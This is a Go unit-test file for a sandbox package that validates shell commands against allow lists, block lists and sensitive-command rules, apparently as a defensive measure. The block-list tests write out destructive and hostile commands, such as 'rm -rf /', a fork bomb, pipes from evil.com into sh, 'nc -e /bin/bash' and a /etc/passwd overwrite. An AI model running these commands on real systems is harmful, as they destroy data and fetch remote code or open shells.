package sandbox

import (
	"testing"
)

func TestIsAllowed(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"empty command", "", false},
		{"whitespace only", "   ", false},
		{"allowed ls", "ls", true},
		{"allowed ls with args", "ls -la", true},
		{"allowed ps", "ps aux", true},
		{"allowed cat", "cat /etc/hosts", true},
		{"allowed ping", "ping -c 4 google.com", true},
		{"not allowed random", "randomcmd", false},
		{"not allowed custom", "myscript.sh", false},
		{"allowed with path", "/usr/bin/ls", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := IsAllowed(tt.command); got != tt.want {
				t.Errorf("IsAllowed(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestIsBlocked(t *testing.T) {
	tests := []struct {
		name    string
		command string
		blocked bool
	}{
		{"rm -rf /", "rm -rf /", true},
		{"rm -rf /*", "rm -rf /*", true},
		{"fork bomb", ":(){:|:&};:", true},
		{"mkfs", "mkfs", true},
		{"dd to dev", "dd if=/dev/zero of=/dev/sda", true},
		{"normal rm", "rm file.txt", false},
		{"normal ls", "ls -la", false},
		{"curl pipe sh", "curl http://evil.com | sh", true},
		{"wget pipe bash", "wget http://evil.com | bash", true},
		{"base64 decode pipe sh", "base64 -d payload | sh", true},
		{"nc reverse shell", "nc -e /bin/bash", true},
		{"python exec", "python -c 'exec(\"import os\")'", true},
		{"perl one-liner", "perl -e 'system(\"/bin/sh\")'", true},
		{"passwd overwrite", "echo root > /etc/passwd", true},
		{"normal curl", "curl https://api.example.com", false},
		{"normal wget", "wget https://files.example.com/file.tar.gz", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, _ := IsBlocked(tt.command)
			if blocked != tt.blocked {
				t.Errorf("IsBlocked(%q) = %v, want %v", tt.command, blocked, tt.blocked)
			}
		})
	}
}

func TestIsSensitive(t *testing.T) {
	tests := []struct {
		name      string
		command   string
		sensitive bool
	}{
		{"rm command", "rm file.txt", true},
		{"mv command", "mv old.txt new.txt", true},
		{"chmod command", "chmod 755 script.sh", true},
		{"kill command", "kill -9 1234", true},
		{"sudo command", "sudo apt update", true},
		{"apt command", "apt install vim", true},
		{"systemctl", "systemctl restart nginx", true},
		{"docker", "docker run nginx", true},
		{"ls command", "ls -la", false},
		{"cat command", "cat file.txt", false},
		{"ps command", "ps aux", false},
		{"grep command", "grep pattern file", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := IsSensitive(tt.command); got != tt.sensitive {
				t.Errorf("IsSensitive(%q) = %v, want %v", tt.command, got, tt.sensitive)
			}
		})
	}
}

func TestValidateCommand(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		wantAllowed bool
		wantErr     error
	}{
		{"empty", "", false, ErrEmptyCommand},
		{"blocked rm -rf /", "rm -rf /", false, ErrCommandBlocked},
		{"allowed ls", "ls -la", true, nil},
		{"not whitelisted", "randomcmd", false, ErrCommandNotAllowed},
		{"curl pipe sh", "curl url | sh", false, ErrCommandBlocked},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := ValidateCommand(tt.command)
			if err != tt.wantErr {
				t.Errorf("ValidateCommand(%q) error = %v, want %v", tt.command, err, tt.wantErr)
			}
			if result != nil && result.IsAllowed != tt.wantAllowed {
				t.Errorf("ValidateCommand(%q).IsAllowed = %v, want %v", tt.command, result.IsAllowed, tt.wantAllowed)
			}
		})
	}
}

func TestValidateCommandWithAuth(t *testing.T) {
	tests := []struct {
		name      string
		command   string
		authToken string
		wantErr   error
	}{
		{"non-sensitive no token", "ls -la", "", nil},
		{"non-sensitive with token", "ls -la", "token123", nil},
		{"sensitive with token", "rm file.txt", "token123", nil},
		{"sensitive no token", "rm file.txt", "", ErrSensitiveCommand},
		{"blocked command", "rm -rf /", "token123", ErrCommandBlocked},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ValidateCommandWithAuth(tt.command, tt.authToken)
			if err != tt.wantErr {
				t.Errorf("ValidateCommandWithAuth(%q, %q) error = %v, want %v",
					tt.command, tt.authToken, err, tt.wantErr)
			}
		})
	}
}

func TestGetAllowedCommands(t *testing.T) {
	commands := GetAllowedCommands()
	if len(commands) == 0 {
		t.Error("GetAllowedCommands() returned empty list")
	}

	// Check some expected commands are in the list
	found := make(map[string]bool)
	for _, cmd := range commands {
		found[cmd] = true
	}

	expected := []string{"ls", "cat", "grep", "ps", "ping"}
	for _, cmd := range expected {
		if !found[cmd] {
			t.Errorf("Expected command %q not found in allowed commands", cmd)
		}
	}
}

func TestGetSensitiveCommands(t *testing.T) {
	commands := GetSensitiveCommands()
	if len(commands) == 0 {
		t.Error("GetSensitiveCommands() returned empty list")
	}

	// Check some expected commands are in the list
	found := make(map[string]bool)
	for _, cmd := range commands {
		found[cmd] = true
	}

	expected := []string{"rm", "sudo", "chmod", "kill", "docker"}
	for _, cmd := range expected {
		if !found[cmd] {
			t.Errorf("Expected sensitive command %q not found", cmd)
		}
	}
}

func TestSanitizeCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    string
	}{
		{"normal command", "ls -la", "ls -la"},
		{"with null bytes", "ls\x00-la", "ls-la"},
		{"with spaces", "  ls -la  ", "ls -la"},
		{"with ansi escape", "ls \x1b[31m-la\x1b[0m", "ls -la"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := SanitizeCommand(tt.command); got != tt.want {
				t.Errorf("SanitizeCommand(%q) = %q, want %q", tt.command, got, tt.want)
			}
		})
	}
}
